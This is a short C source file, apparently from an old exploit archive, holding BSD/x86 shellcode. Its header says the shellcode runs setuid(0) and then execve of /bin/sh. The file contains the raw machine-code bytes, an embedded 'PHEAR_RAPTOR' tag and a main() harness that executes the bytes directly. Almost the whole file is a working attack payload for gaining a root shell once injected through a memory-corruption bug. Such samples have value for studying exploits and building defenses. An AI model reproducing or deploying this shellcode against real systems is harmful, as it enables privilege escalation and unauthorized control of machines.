/*
 * $Id: leetcode.c,v 1.2 2004/06/02 12:22:30 raptor Exp $
 *
 * leetcode.c - shellcode for BSD/x86 (tested on OpenBSD)
 * Copyright (c) 2002 Raptor <raptor@0xdeadbeef.eu.org>
 *
 * This shellcode does an execve of /bin/sh after a 
 * setuid(0), placing parameters on the stack (BSD-like).
 *
 * Note the elite ascii message buried into the code:)
 *
 */


char code[] = 	"\x31\xc9\x31\xc0\x50\x50\xb0\x17\xcd\x80\x31\xc0\x40"
		"PHEAR_RAPTOR"
		"\xeb\x19\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3"
		"\x8d\x56\x08\x49\x49\xb0\x3b\x51\x52\x53\x53\xcd\x80"
		"\xe8\xe2\xff\xff\xff/bin/sh";

main()
{
	int (*funct)();
	funct = (int (*)()) code;
	(int)(*funct)();
}
